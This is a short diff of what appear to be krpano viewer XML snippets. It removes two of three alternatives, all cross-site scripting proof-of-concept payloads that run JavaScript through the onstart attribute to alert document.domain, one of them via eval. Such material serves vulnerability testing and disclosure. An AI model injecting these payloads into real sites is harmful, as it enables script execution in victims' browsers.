@@ -1,8 +1,4 @@
-<!-- Alternative 1: With concatenation -->
-<krpano version="1.18" onstart="js(alert('Domain: ' + document.domain));">
 
-<!-- Alternative 2: Just the domain -->
-<krpano version="1.18" onstart="js(alert(String(document.domain)));">
 
 <!-- Alternative 3: Using eval -->
 <krpano version="1.18" onstart="js(eval('alert(document.domain)'));">
